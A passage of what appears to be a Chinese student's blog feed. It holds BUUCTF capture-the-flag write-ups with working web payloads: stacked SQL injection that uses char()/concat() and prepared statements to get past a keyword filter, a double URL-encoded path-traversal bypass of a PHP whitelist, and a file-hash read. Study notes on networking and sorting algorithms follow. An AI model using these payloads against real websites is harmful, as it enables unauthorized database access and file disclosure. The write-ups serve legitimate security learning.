<p>然后，尴尬的问题又来了，不会写脚本 哭了，还是python的<br>所以说，开发和安全缺一不可，只好去找大佬的脚本<br><img src="/images/BUUCTF/tornado/2.png" alt="avatar"></p>
<p>构造payload:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">file?filename=/fllllllllllllag&amp;&amp;filehash=97a05accf0b1378842a54ec11b3074cb</span><br></pre></td></tr></table></figure>

<p>得到flag</p>
<p>学到了学到了 看完脚本之后，我觉得还是很简单的，就是没学python不懂语法，待我去肝一肝python</p>
]]></content>
      <categories>
        <category>WP</category>
        <category>WEB</category>
      </categories>
      <tags>
        <tag>CTF</tag>
      </tags>
  </entry>
  <entry>
    <title>BUUCTF-随便注 1</title>
    <url>/2020/01/18/BUUCTF-%E9%9A%8F%E4%BE%BF%E6%B3%A8-1/</url>
    <content><![CDATA[<h1 id="随便注-1"><a href="#随便注-1" class="headerlink" title="随便注 1"></a>随便注 1</h1><p>之前在强网杯的时候遇到这道题，当时卡了挺久的，就差最后一步 真的太可惜了</p>
<p>先随便点击一下提交<br><img src="/images/BUUCTF/%E9%9A%8F%E4%BE%BF%E6%B3%A81/0.png" alt="avatar"></p>
<p>看得出是一个sql注入类型的题目</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入</span><br><span class="line">1 没有报错</span><br><span class="line">1&apos; 出现报错，验证存在注入</span><br><span class="line">1’# 没有报错</span><br><span class="line">1&apos; order by 1# 没有报错</span><br><span class="line">1&apos; order by 3# 出现报错，证明字段有2个</span><br><span class="line">1&apos; union select 1,2#   return preg_match(&quot;/select|update|delete|drop|insert|where|\./i&quot;,$inject); 过滤掉了很多关键字</span><br></pre></td></tr></table></figure>
<p>当时就卡在这里，现在想想还是很亏没有考虑的很多，赛后看了大佬们的WP才知道思路：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1&apos;;show databases;# 成功，说明存在堆叠注入</span><br></pre></td></tr></table></figure>
<p>堆叠注入可以参考一下：<br><a href="https://www.cnblogs.com/0nth3way/articles/7128189.html" target="_blank" rel="noopener">https://www.cnblogs.com/0nth3way/articles/7128189.html</a></p>
<p>我的理解下来，加上学完了数据库原理，大概意思就是;在数据库中代表一条语句的结束，系统识别到;时，前面的代码在系统中就被视为已经结束，所以可以利用;来进行堆叠注入</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1&apos;;show tables;# 得到表名1919810931114514</span><br></pre></td></tr></table></figure>
<p>这里用到了Mysql的预处理语句，可以参考这里：<a href="https://www.cnblogs.com/geaozhang/p/9891338.html" target="_blank" rel="noopener">https://www.cnblogs.com/geaozhang/p/9891338.html</a></p>
<p>感觉有点像数据库安全那里，创建角色，然后把权限赋值给该角色，再通过该角色依次赋予权限，主要是为了省事。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">PREPARE sqla FROM &apos;[my sql sequece]&apos;; 预定义SQL语句</span><br><span class="line">EXECUTE sqla; 执行预定义sql语句</span><br><span class="line">(DEALLOCATE || DROP) PREPARE sqla; 删除预定义SQL语句</span><br></pre></td></tr></table></figure>
<p>也可以通过变量传输</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">SET @tn=&apos;hahaha&apos;; 存储表名</span><br><span class="line">SET @sql=concat(&apos;select * from &apos;,@tn); 存储sql语句</span><br><span class="line">PREPARE sqla FROM @sql; 预定义SQL语句</span><br><span class="line">EXECUTE sqla; 执行SQL预定义语句</span><br><span class="line">(DEALLOCATE || DROP) PREPARE sqla; 删除预定义SQL语句</span><br></pre></td></tr></table></figure>

<p>构造payload<br>这里可以用char()方法将ASCII码转换为select字符串，再利用concat()拼接</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">11&apos;;SET @sql=concat(char(115,101,108,101,99,116),&quot; * from `1919810931114514`&quot;);PREPARE sqla from @sql;EXECUTEsqla;#</span><br></pre></td></tr></table></figure>

<p>得到flag</p>
]]></content>
      <categories>
        <category>WP</category>
        <category>WEB</category>
      </categories>
      <tags>
        <tag>CTF</tag>
      </tags>
  </entry>
  <entry>
    <title>BUUCTF-WarmUP</title>
    <url>/2020/01/18/BUUCTF-WarmUP/</url>
    <content><![CDATA[<h1 id="WarmUp"><a href="#WarmUp" class="headerlink" title="WarmUp"></a>WarmUp</h1><p>首先启动环境，发现滑稽图；没有什么好说的crtl+u查看源码：<br><img src="/images/BUUCTF/WarmUp/0.png" alt="avatar"></p>
<p>得到提示：source.php</p>
<p>通过URL访问一下 得到源码：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">emmm</span></span></span><br><span class="line"><span class="class">    </span>&#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">static</span> <span class="function"><span class="keyword">function</span> <span class="title">checkFile</span><span class="params">(&amp;$page)</span></span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            $whitelist = [<span class="string">"source"</span>=&gt;<span class="string">"source.php"</span>,<span class="string">"hint"</span>=&gt;<span class="string">"hint.php"</span>];</span><br><span class="line">            <span class="keyword">if</span> (! <span class="keyword">isset</span>($page) || !is_string($page)) &#123;</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">"you can't see it"</span>;</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (in_array($page, $whitelist)) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            $_page = mb_substr(</span><br><span class="line">                $page,</span><br><span class="line">                <span class="number">0</span>,</span><br><span class="line">                mb_strpos($page . <span class="string">'?'</span>, <span class="string">'?'</span>)</span><br><span class="line">            );</span><br><span class="line">            <span class="keyword">if</span> (in_array($_page, $whitelist)) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            $_page = urldecode($page);</span><br><span class="line">            $_page = mb_substr(</span><br><span class="line">                $_page,</span><br><span class="line">                <span class="number">0</span>,</span><br><span class="line">                mb_strpos($_page . <span class="string">'?'</span>, <span class="string">'?'</span>)</span><br><span class="line">            );</span><br><span class="line">            <span class="keyword">if</span> (in_array($_page, $whitelist)) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">"you can't see it"</span>;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (! <span class="keyword">empty</span>($_REQUEST[<span class="string">'file'</span>])</span><br><span class="line">        &amp;&amp; is_string($_REQUEST[<span class="string">'file'</span>])</span><br><span class="line">        &amp;&amp; emmm::checkFile($_REQUEST[<span class="string">'file'</span>])</span><br><span class="line">    ) &#123;</span><br><span class="line">        <span class="keyword">include</span> $_REQUEST[<span class="string">'file'</span>];</span><br><span class="line">        <span class="keyword">exit</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"&lt;br&gt;&lt;img src=\"https://i.loli.net/2018/11/01/5bdb0d93dc794.jpg\" /&gt;"</span>;</span><br><span class="line">    &#125;  </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>得知是PHP代码审计题</p>
<p>通过代码审计可以得到还有一个hint.php  访问得到：<br>flag not here, and flag in ffffllllaaaagggg</p>
<p>所以考虑最后的payload需要用到ffffllllaaaagggg</p>
<p>并且得到参数名称为file</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">if (! empty($_REQUEST[&apos;file&apos;])</span><br><span class="line">        &amp;&amp; is_string($_REQUEST[&apos;file&apos;])</span><br><span class="line">        &amp;&amp; emmm::checkFile($_REQUEST[&apos;file&apos;])</span><br><span class="line">    ) &#123;</span><br><span class="line">        include $_REQUEST[&apos;file&apos;];</span><br><span class="line">        exit;</span><br></pre></td></tr></table></figure>
<p> 关键代码，得知file变量不能为空，必须是字符串，还必须通过checkFile的检查<br> 经过查询函数：mb_strpos和mb_substr 的意思是截取变量page中？前面的字符串进行白名单校验<br> 所以source.php和hint.php均在白名单内，随意取一个构造payload:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?file=hint.php?/../../../../../../../../../../../../../../../ffffllllaaaagggg</span><br></pre></td></tr></table></figure>
<p>发现无法通过，是因为进行了三次检查，所以考虑URL编码问题，把?进行URL编码(注意使用英文?)<br>进行三次编码后?变为：%253F<br>构造payload：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">file=hint.php%253F/../../../../../../../../../../../../../../../ffffllllaaaagggg</span><br></pre></td></tr></table></figure>
<p>得到flag</p>
]]></content>
      <categories>
        <category>WP</category>
        <category>WEB</category>
      </categories>
      <tags>
        <tag>CTF</tag>
      </tags>
  </entry>
  <entry>
    <title>第三章-数据链路层</title>
    <url>/2019/12/02/%E7%AC%AC%E4%B8%89%E7%AB%A0-%E6%95%B0%E6%8D%AE%E9%93%BE%E8%B7%AF%E5%B1%82/</url>
    <content><![CDATA[<h1 id="第三章-数据链路层"><a href="#第三章-数据链路层" class="headerlink" title="第三章-数据链路层"></a>第三章-数据链路层</h1><h2 id="主要知识"><a href="#主要知识" class="headerlink" title="主要知识"></a>主要知识</h2><pre><code>数据链路层使用的两种主要信道是：
1.点对点信道
2.广播信道

数据链路层的三个基本问题：封装成帧，透明传输和差错检测
    封装成帧：在一段数据前后分别添加首部和尾部，构成一个帧，目的是让计算机知道何为开始，何为结束
    透明传输：表示无论什么样的比特组合的数据，都能够按照原样没有差错地通过这个数据链路层
    差错检测：只能检测出比特差错，广泛使用循环冗余检验CRC

数据链路层传输数据的基本单位是：帧

链路：就是从一个结点到相邻结点的一段物理线路（有线或无线），而中间没有任何其他的交换结点

*CRC：
    第一种情况，是发送端向接收方发送数据
    例：P（x）=x^3+1=&gt;1001（4位）
    想要发送的数据：1011 1100
    实际发送的数据：1011 1100 0000 （4-1）位
    FCS：（4-1）位</code></pre><p><img src="/images/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/CRC.png" alt="avatar"></p>
<pre><code>余数作为FCS

    第二种情况，是接收方接收到的数据
    例：P（x）=x^3+1=&gt;1001(4位)
    接收到的数据1011 1100 0000
    这里由于是接收方发来的数据，所以不用再添加零

    现在使用1001除于1011 1100 0000查看余数是否为0，若不为零，则发送数据出现了差错；反之

 CRC只能检测出比特差错而不能纠正这种差错，所以数据链路层向网络层的是“不可靠传输”的服务

除了比特差错还有：帧丢失，帧重复，帧失序；这一类差错属于传输差错

点对点协议PPP：
    特点：1.简单 2.封装成帧 3.透明性 4.多种网络层协议 5.多种类型链路 6.差错检测 7.检测连接状态 8.最大传输单元 9.网络层地址协商 10.数据压缩协商

   组成：
   1.一个将IP数据报封装到串行链路的方法
   2.一个用来建立，配置和测试连接的链路控制协议LCP
   3.一套网络控制协议NCP

   帧的格式：</code></pre><p><img src="/images/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/%E5%B8%A7%E7%9A%84%E6%A0%BC%E5%BC%8F.png" alt="avatar"></p>
<pre><code> 字节填充：当使用异步传输时，转义符定义为0x7D
方法：每出现一个0x7E就变为0x7D,0x5E
      每出现一个0x7D就变为0x7D,0x5D

零比特填充：发送端：发送连续的5个1，就在后面添加一个0
          接收端：接受连续的5个1，就把后面的一个0删除

局域网的主要优点：
1.具有广播功能
2.灵活多变
3.提高了系统的可靠性，可用性和生存性

局域网按拓扑结构可以分为：星型，环型和总线型

共享媒体资源的方法：
    1.静态划分信道（频分复用，时分复用等复用技术）
    2.动态媒体接入控制：随机接入，受控接入

以太网：以太网就是局域网，局域网&gt;以太网
    标准：DIX Ethernet V2 和 IEEE 802.3

网络适配器：俗称就是网卡
    功能：
    1.进行数据串行传输和并行传输转换
    2.对数据进行缓存
    3.在计算机的操作系统中安装驱动程序
    4.实现以太网协议

 以太网使用的是：CSMA/CD协议
     为了通信的简便，采用灵活的无连接工作方式，不进行编号，也不要求对方发回请求；所以是不可靠传输

  CSMA/CD的要点：
      多点接入：许多计算机以多点接入连接到一根总线上
      载波监听：每个站不停地检测信道
      碰撞检测：边发送边监听

  CSMA/CS采用的是半双工通信

  MAC层的硬件地址：
   MAC地址就是硬件地址
   在网络适配器上
   有48位（唯一性）
   工作在数据链路层

 以太网交换机：实际上就是多个接口的网桥
     每个通信的主机都是独占传输媒体，无碰撞地传输数据
     对收到的帧采用存储转发的方式

   交换表采用的是自学习算法：</code></pre><p><img src="/images/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/%E8%87%AA%E5%AD%A6%E4%B9%A0%E7%AE%97%E6%B3%95.png" alt="avatar"></p>
<pre><code>100BASE-T:在双绞线上传输100Mbit/s基带信号
T：双绞线
BASE：基带信号
100：100Mbit/s</code></pre><h2 id="部分习题"><a href="#部分习题" class="headerlink" title="部分习题"></a>部分习题</h2><pre><code>*网络适配器的作用？工作在哪一层？
    1.进行数据串行传输和并行传输转换 
    2.对数据进行缓存
    3.在计算机的操作系统中安装驱动程序
    4.实现以太网协议；工作在数据链路层
    工作在数据链路层
*数据链路层的三个基本问题为什么都必须加以解决？
    ⑴封装成帧就是在一段数据前后分别添加首部和尾部。接收端以便从收到的比特流中识别帧的开始与结束，帧定界是分组交换的必然要求；
    ⑵ 透明传输避免消息符号与帧定界符号相混淆；
    ⑶差错检测防止差错的无效数据帧，浪费网络资源。</code></pre><h2 id="思维导图"><a href="#思维导图" class="headerlink" title="思维导图"></a>思维导图</h2><p><img src="/images/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/%E6%95%B0%E6%8D%AE%E9%93%BE%E8%B7%AF%E5%B1%82.png" alt="avatar">    </p>
]]></content>
      <categories>
        <category>日常学习</category>
        <category>计算机网络</category>
      </categories>
      <tags>
        <tag>日常学习</tag>
      </tags>
  </entry>
  <entry>
    <title>第二章-物理层</title>
    <url>/2019/12/01/%E7%AC%AC%E4%BA%8C%E7%AB%A0-%E7%89%A9%E7%90%86%E5%B1%82/</url>
    <content><![CDATA[<h1 id="第二章-物理层"><a href="#第二章-物理层" class="headerlink" title="第二章-物理层"></a>第二章-物理层</h1><h2 id="一、主要知识"><a href="#一、主要知识" class="headerlink" title="一、主要知识"></a>一、主要知识</h2><pre><code>常用术语：
数据：运送给消息的实体
信号：数据的电气和电子表示
模拟数据：数据是连续的
模拟信号：代表参数的取值是连续的
数字数据：数据是离散的
数字信号：代表参数的取值是离散的
基带信号：信源发出的信号
带通信号：经过调制之后的信号
码元：在使用时间域的波形
单工通信：只有一方可以发送数据，另一方接受数据
半双工通信：同一时间内，只有一方可以发送数据
全双工通信：同一时间内，双方都可以发送和接收数据

物理层的功能：尽可能地屏蔽掉传顺媒体，通信手段的差异，让数据链路层更好地传输比特流

传输媒体的接口特性：
1.机械特性：形状，尺寸，引脚数目和引脚排列顺序等
2.电气特性：电压的范围
3.功能特性：某一电平的电压意义
4.过程特性：事件发生的顺序

数据通信系统可以分为：源系统，传输系统，目的系统</code></pre><p>   <img src="/images/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/%E6%95%B0%E6%8D%AE%E9%80%9A%E4%BF%A1%E7%B3%BB%E7%BB%9F%E7%9A%84%E6%A8%A1%E5%9E%8B.png" alt="avatar"><br>       注：调制解调器的作用是为了在模拟信道上传输数字数据</p>
<pre><code>常见的编码方式：
1.不归零制
2.归零制
3.曼切斯特编码
4.差分曼切斯特编码

基本的带通调制方法：
调幅：即载波的振幅随基带数字信号而变化
调频：即载波的频率随基带数字信号而变化
调相：即载波的初始相位随基带数字信号而变化

传输媒体可以分为两大类：
一、导引型传输媒体
    1.双绞线 2.同轴电缆 3.光纤
二、非导引型传输媒体
    微波，卫星等

 *信道复用技术：
 频分复用FDM
 时分复用TDM
 统计时分复用STDM
 波分复用WDM
 码分复用CDM

 ADSL技术：非对称数字用户线ADSL

 奈氏准则：在任何信道，传输速率都有上限值，超出则出现码间串扰

 香农公式：只要不超出上限值，一定有方法实现无差错传输

 信噪比：信号平均功率和噪音平均功率之比

 频带宽度，信噪比，码元传输速率确定了如何提高传输速率？</code></pre><h2 id="二、部分习题"><a href="#二、部分习题" class="headerlink" title="二、部分习题"></a>二、部分习题</h2><pre><code>假定某信道受奈氏准则限制的最高码元速率为20000码元/秒。如果采用振幅调制，把码元的振幅分为16个不同等级来传送，那么可以获得多高的数据率？
    公式：</code></pre><p>  <img src="/images/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/%E5%A5%88%E6%B0%8F%E5%87%86%E5%88%99.png" alt="avatar"></p>
<pre><code>n：最高码元速率
a:16=2^4 则a=4
数据率=20000*4=80000码元/秒

共有四个站进行码分多址CDMA通信。四个站的码片序列为：
A：（-1，-1，-1，+1，+1，-1，+1，+1）
B：（-1，-1，+1，-1，+1，+1，+1，-1）
C：（-1，+1，-1，+1，+1，+1，-1，-1）
D：（-1，+1，-1，-1，-1，-1，+1，-1）

现收到这样的码片序列：(-1，+1，-3，+1，-1，-3，+1，+1)。问哪个站发送数据了？发送数据的站发送的是1还是0？

步骤：S：(-1，+1，-3，+1，-1，-3，+1，+1) 分别与A,B,C,D对应相乘再相加，最后的数再/8
如果最后的数为1，则发送1
如果最后的数为0，则没有发送
如果最后的数为-1，则发送0</code></pre><h2 id="三、思维导图"><a href="#三、思维导图" class="headerlink" title="三、思维导图"></a>三、思维导图</h2><p>   <img src="/images/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/%E7%89%A9%E7%90%86%E5%B1%82.png" alt="avatar"></p>
]]></content>
      <categories>
        <category>日常学习</category>
        <category>计算机网络</category>
      </categories>
      <tags>
        <tag>日常学习</tag>
      </tags>
  </entry>
  <entry>
    <title>快速排序</title>
    <url>/2019/11/19/%E5%BF%AB%E9%80%9F%E6%8E%92%E5%BA%8F/</url>
    <content><![CDATA[<h1 id="快速排序"><a href="#快速排序" class="headerlink" title="快速排序"></a>快速排序</h1><h2 id="一、快排思想"><a href="#一、快排思想" class="headerlink" title="一、快排思想"></a>一、快排思想</h2><pre><code>快排其实就是冒泡的改进；主要思路就是划分元素——主元。
例如：3 5 2 7 9 0 1 4
    ___________________

    1 0 2| 3 |9 7 5 4

    左子序-|主元|-右子序

    1 0 2| 3 |9 7 5 4</code></pre><h2 id="二、步骤"><a href="#二、步骤" class="headerlink" title="二、步骤"></a>二、步骤</h2><pre><code>1.划分：选定一个记录作为主元，以主元为基准将整个序列划分为两个子序列
2.分别求解子问题
3.合并子问题</code></pre><h2 id="三、示例"><a href="#三、示例" class="headerlink" title="三、示例"></a>三、示例</h2><p><img src="/images/%E5%88%86%E6%B2%BB%E6%B3%95/%E5%BF%AB%E6%8E%920.png" alt="avatar"></p>
<h2 id="四、过程"><a href="#四、过程" class="headerlink" title="四、过程"></a>四、过程</h2><pre><code>1.初始化：取第一个记录作为基准，设置两个参数i,j分别指向将要与基准记录进行比较的左侧和右侧记录
2.右侧扫描，用基准记录与j指向的记录进行比较，重复此过程，直到右侧记录小结束，若i&lt;j,则将基准记录与j指向的记录进行交换
3.左侧扫描，用基准记录与i指向的记录进行比较，重复此过程，直到右侧的记录大结束，若i&lt;j,则将基准记录与i指向的记录进行交换
4.重复2，3步，直到i,j指向同一个位置</code></pre><h2 id="五、伪码"><a href="#五、伪码" class="headerlink" title="五、伪码"></a>五、伪码</h2><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">Partition</span><span class="params">(<span class="keyword">int</span> r[],<span class="keyword">int</span> first,<span class="keyword">int</span> <span class="built_in">end</span>)</span></span>&#123;</span><br><span class="line">    i=first;j=<span class="built_in">end</span>; <span class="comment">//初始化</span></span><br><span class="line">    <span class="keyword">while</span>(i&lt;j)&#123;</span><br><span class="line">    	<span class="keyword">while</span>(i&lt;j&amp;&amp;r[i]&lt;=r[j]) j--; <span class="comment">//右侧扫描</span></span><br><span class="line">        <span class="keyword">if</span>(i&lt;j)&#123;</span><br><span class="line">        	r[i]&lt;--&gt;r[j]; <span class="comment">//将较小的记录交换到前面</span></span><br><span class="line">            i++;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">while</span>(i&lt;j&amp;&amp;r[i]&lt;=r[j]) i++; <span class="comment">//左侧扫描</span></span><br><span class="line">        	<span class="keyword">if</span>(i&lt;j)&#123;</span><br><span class="line">            	r[j]&lt;--&gt;r[i]; <span class="comment">//将较大的记录交换到后面</span></span><br><span class="line">                j--;</span><br><span class="line">            &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    	<span class="keyword">return</span> i; <span class="comment">//i作为主元记录的最终位置</span></span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">QuickSort</span><span class="params">(<span class="keyword">int</span> r[ ], <span class="keyword">int</span> first, <span class="keyword">int</span> <span class="built_in">end</span>)</span></span></span><br><span class="line"><span class="function">  </span>&#123;</span><br><span class="line">     <span class="keyword">if</span> (first&lt;<span class="built_in">end</span>) &#123;      </span><br><span class="line">        pivot=Partition(r, first, <span class="built_in">end</span>);  </span><br><span class="line">          <span class="comment">//问题分解，pivot是主元（轴值）在序列中的位置</span></span><br><span class="line">        QuickSort(r, first, pivot<span class="number">-1</span>); </span><br><span class="line">          <span class="comment">//递归地对左侧子序列进行快速排序</span></span><br><span class="line">        QuickSort(r, pivot+<span class="number">1</span>, <span class="built_in">end</span>);</span><br><span class="line">          <span class="comment">//递归地对右侧子序列进行快速排序</span></span><br><span class="line">     &#125;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>
<h3 id="时间复杂度"><a href="#时间复杂度" class="headerlink" title="@时间复杂度"></a>@时间复杂度</h3><p><img src="/images/%E5%88%86%E6%B2%BB%E6%B3%95/%E5%BF%AB%E6%8E%921.png" alt="avatar"></p>
<pre><code>最坏情况：  O(n^2)</code></pre><p><img src="/images/%E5%88%86%E6%B2%BB%E6%B3%95/%E5%BF%AB%E6%8E%922.png" alt="avatar"></p>
<pre><code>平均情况：O(n*logn)</code></pre>]]></content>
      <categories>
        <category>算法设计</category>
      </categories>
      <tags>
        <tag>算法</tag>
      </tags>
  </entry>
  <entry>
    <title>分治法</title>
    <url>/2019/11/19/%E5%88%86%E6%B2%BB%E6%B3%95/</url>
    <content><![CDATA[<h1 id="分治法"><a href="#分治法" class="headerlink" title="分治法"></a>分治法</h1><h2 id="一、分治思想"><a href="#一、分治思想" class="headerlink" title="一、分治思想"></a>一、分治思想</h2><pre><code>大问题分解为很多个子问题，最后合并</code></pre><h2 id="二、步骤："><a href="#二、步骤：" class="headerlink" title="二、步骤："></a>二、步骤：</h2><pre><code>1.划分子问题
2.求解子问题
3.合并子问题</code></pre><h2 id="三、归并："><a href="#三、归并：" class="headerlink" title="三、归并："></a>三、归并：</h2><pre><code>例子：
3 5 2 7 9 0 1 4
这里我们开辟出一个新的存放空间K,用两个指针i,j分别指向两个子问题的最开始元素；然后进行比较。最后变为：
2 3 5 7 | 0 1 4 9
再将这两个有序的子问题用相同的方法进行合并即可。 这就是归并的思想</code></pre><h2 id="四、伪码："><a href="#四、伪码：" class="headerlink" title="四、伪码："></a>四、伪码：</h2><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">MergeSort</span><span class="params">(<span class="keyword">int</span> r[],<span class="keyword">int</span> r1[],<span class="keyword">int</span> L,<span class="keyword">int</span> R)</span></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(L==R) r1[L]=r[L]; <span class="comment">//只有一个元素，直接赋值</span></span><br><span class="line">   		<span class="keyword">else</span>&#123;</span><br><span class="line">        	m=(L+R)/<span class="number">2</span>;</span><br><span class="line">          Mergesort(r,r1,L,m);	<span class="comment">//归并排序前半个子序列</span></span><br><span class="line">          Mergesort(r,r1,m+<span class="number">1</span>,R); <span class="comment">//归并排序后半个子序列</span></span><br><span class="line">      		 Merge(r1,r,L,m,R); <span class="comment">//合并两个已排序的子序列</span></span><br><span class="line">          &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">Merge</span><span class="params">(<span class="keyword">int</span> r[],<span class="keyword">int</span> r1[],<span class="keyword">int</span> L,<span class="keyword">int</span> m,<span class="keyword">int</span> R)</span></span>&#123;</span><br><span class="line">    	i=L;j=m+<span class="number">1</span>;k=L;</span><br><span class="line">        <span class="keyword">while</span>(j&lt;=m&amp;&amp;j&lt;=t)&#123;</span><br><span class="line">        	<span class="keyword">if</span>(r[i]&lt;=r[j]) r1[k++]=r[i++];</span><br><span class="line">            <span class="keyword">else</span> r1[k++]=r[j++];</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(i&lt;=m) <span class="keyword">while</span>(i&lt;=m)</span><br><span class="line">        	r1[k++]=r[i++];</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">while</span>(j&lt;=R)</span><br><span class="line">        	r1[k++]=r[j++];</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
<h3 id="时间复杂度"><a href="#时间复杂度" class="headerlink" title="@时间复杂度"></a>@时间复杂度</h3><pre><code>T（N）=O(n*logn)</code></pre><h3 id="空间复杂度"><a href="#空间复杂度" class="headerlink" title="@空间复杂度"></a>@空间复杂度</h3><pre><code>O(n)</code></pre><h2 id="五、图解"><a href="#五、图解" class="headerlink" title="五、图解"></a>五、图解</h2><p><img src="/images/%E5%88%86%E6%B2%BB%E6%B3%95/%E5%88%86%E6%B2%BB0.png" alt="avatar"></p>
<p><img src="/images/%E5%88%86%E6%B2%BB%E6%B3%95/%E5%88%86%E6%B2%BB1.png" alt="avatar"></p>
]]></content>
      <categories>
        <category>算法设计</category>
      </categories>
      <tags>
        <tag>算法</tag>
      </tags>
  </entry>
  <entry>
    <title>第一章-绪论</title>
    <url>/2019/11/18/%E7%AC%AC%E4%B8%80%E7%AB%A0-%E7%BB%AA%E8%AE%BA/</url>
    <content><![CDATA[<h1 id="第一章-绪论"><a href="#第一章-绪论" class="headerlink" title="第一章-绪论"></a>第一章-绪论</h1><h2 id="主要知识"><a href="#主要知识" class="headerlink" title="主要知识"></a>主要知识</h2><pre><code>熟悉的网络有三大类：电信网络，有线电视网络和计算机网络

计算机网络的主要功能是：资源共享和数据通信（具有连通信和共享性）

计算机网络的组成：由若干结点和连接它们的链路组成

ARPANET是互联网的雏形

internet(互连网)是一个通用名词，泛指多个计算机网络互相连接的计算机网阔

Internet(互联网）是一个专有名词，指全球目前最大的，开放的互连网

ISP:互联网服务提供商（移动，电信，联通）</code></pre><p><img src="/images/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/ISP%E6%A6%82%E5%BF%B5%E7%A4%BA%E6%84%8F%E5%9B%BE.png" alt="avatar"></p>
<pre><code>*互联网的拓扑结构虽然非常复杂，但是按照工作方式分，可以分为：
边缘部分和核心部分

边缘部分：由所有连接在互联网上的主机组成，用户可以直接使用（资源共享和数据通信）
核心部分：由网络和连接这些网络的路由器组成，为边缘部分提供服务</code></pre><p><img src="/images/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/%E6%A0%B8%E5%BF%83%E8%BE%B9%E7%BC%98%E7%A4%BA%E6%84%8F%E5%9B%BE.png" alt="avatar"></p>
<pre><code>网络边缘的通信方式通常可以划分为两大类：客户-服务器方式（C/S）和对等方式（C/S）

关于两者的区别：
前者强调服务者与被服务者的关系，后者没有，后者其实就是前者的双向应用</code></pre><p>   <img src="/images/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/CS%E7%A4%BA%E6%84%8F%E5%9B%BE.png" alt="avatar"><br>   <img src="/images/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/%E5%AF%B9%E7%AD%89%E8%BF%9E%E6%8E%A5%E7%A4%BA%E6%84%8F%E5%9B%BE.png" alt="avatar"></p>
<pre><code>   核心部分起特殊作用的是：路由器；作用是存储转发

边缘部分和核心部分的工作方式是什么？

边缘部分由连接在互联网上的主机组成，用户可以直接使用资源共享，数据通信
核心部分由网络和连接网络的路由器组成，核心部分的工作方式其实就是路由器的工作方式，即存储转发

交换技术分别有哪几种？它们的区别是什么？

交换技术主要有电路交换，报文交换，分组交换；
电路交换将报文的比特流连续从源点直达重点，像在管道中传送
报文交换是整个报文先到相邻节点，全部存储下来之后再查找转发表，进行转发
分组交换其实就是将报文交换中的报文拆分为多个分组，存储转发</code></pre><p> <img src="/images/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/%E4%BA%A4%E6%8D%A2%E6%8A%80%E6%9C%AF%E7%A4%BA%E6%84%8F%E5%9B%BE.png" alt="avatar"></p>
<pre><code> 计算机网络按范围分：
广域网（WAN），城域网（MAN）,局域网(LAN)，个人区域网(PAN)

按用户分：
专用网和公用网

计算机网络性能指标：
速率，带宽，时延，时延带宽积，吞吐量，往返时间RTT，利用率

